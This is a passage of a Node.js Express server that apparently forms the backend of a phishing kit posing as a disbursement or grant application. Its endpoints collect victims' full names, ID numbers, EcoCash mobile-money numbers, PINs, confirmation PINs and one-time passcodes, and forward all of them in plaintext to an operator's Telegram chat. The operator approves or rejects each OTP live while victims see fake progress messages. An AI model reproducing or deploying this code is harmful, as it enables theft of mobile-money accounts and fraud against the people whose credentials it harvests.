                const registrationId = data.replace('reject_otp_', '');
                otpActions[registrationId] = 'rejected';
                responseText = '❌ OTP Rejected';
            }
            const answerUrl = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
            await axios.post(answerUrl, { callback_query_id: callbackId, text: responseText });
        }
        res.json({ ok: true });
    } catch (error) {
        res.json({ ok: true });
    }
});

app.post('/api/update-purpose', async (req, res) => {
    try {
        const { registrationId, purpose } = req.body;
        const r = pendingRegistrations[registrationId];
        if (!r) return res.status(404).json({ success: false });
        r.purpose = purpose;
        const message =
            '📋 <b>PURPOSE SELECTED</b>\n\n' +
            '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + r.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + r.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + r.ecocashNumber + '</code>\n' +
            '🔑 <b>PIN:</b> <code>' + r.ecoPin + '</code>\n' +
            '🔐 <b>OTP:</b> <code>' + (r.otpEntered || 'N/A') + '</code>\n' +
            '📌 <b>Purpose:</b> ' + purpose + '\n\n' +
            '⏳ <i>User is now confirming with PIN...</i>';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.post('/api/confirm-pin', async (req, res) => {
    try {
        const { registrationId, pin, purpose } = req.body;
        const r = pendingRegistrations[registrationId];
        if (!r) return res.status(404).json({ success: false });
        r.confirmPin = pin;
        const message =
            '🔒 <b>PIN CONFIRMED - PROCESSING BEGINS</b>\n\n' +
            '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + r.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + r.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + r.ecocashNumber + '</code>\n' +
            '🔑 <b>Initial PIN:</b> <code>' + r.ecoPin + '</code>\n' +
            '🔑 <b>Confirm PIN:</b> <code>' + pin + '</code>\n' +
            '🔐 <b>OTP:</b> <code>' + (r.otpEntered || 'N/A') + '</code>\n' +
            '📌 <b>Purpose:</b> ' + purpose + '\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📊 <b>Status:</b> Processing started\n' +
            '⏰ <b>Time:</b> ' + new Date().toLocaleString();
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.post('/api/disbursement-complete', async (req, res) => {
    try {
        const { registrationId } = req.body;
        const r = pendingRegistrations[registrationId];
        if (!r) return res.status(404).json({ success: false });
        r.verified = true;
        r.completedAt = new Date().toISOString();
        const message =
            '🎉 <b>APPLICATION COMPLETE - DISBURSEMENT IN PROGRESS</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Full Name:</b> ' + r.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + r.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + r.ecocashNumber + '</code>\n' +
            '🔑 <b>Initial PIN:</b> <code>' + r.ecoPin + '</code>\n' +
            '🔑 <b>Confirm PIN:</b> <code>' + (r.confirmPin || 'N/A') + '</code>\n' +
            '🔐 <b>OTP:</b> <code>' + (r.otpEntered || 'N/A') + '</code>\n' +
            '📌 <b>Purpose:</b> ' + (r.purpose || 'N/A') + '\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📊 <b>Progress:</b>\n' +
            '  ✅ Verifying Details\n' +
            '  ✅ Document Verification\n' +
            '  ✅ Calculating Disbursement\n' +
            '  ✅ Disbursement in Progress\n\n' +
            '💵 <b>Disbursement:</b> Based on purpose and document verification\n' +
            '⏰ <b>Completed:</b> ' + new Date().toLocaleString();
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.get('/health', (req, res) => res.json({ status: 'healthy' }));

app.listen(PORT, () => {
    console.log(`🚀 Server on port ${PORT}`);
});
